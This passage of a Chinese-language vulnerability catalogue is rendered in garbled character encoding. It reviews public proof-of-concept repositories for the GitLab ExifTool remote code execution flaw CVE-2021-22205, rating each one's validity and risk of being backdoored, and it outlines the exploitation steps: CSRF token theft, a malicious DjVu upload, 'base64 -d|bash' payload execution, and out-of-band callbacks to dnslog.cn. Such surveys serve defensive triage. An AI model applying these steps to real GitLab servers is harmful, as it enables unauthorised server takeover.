3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
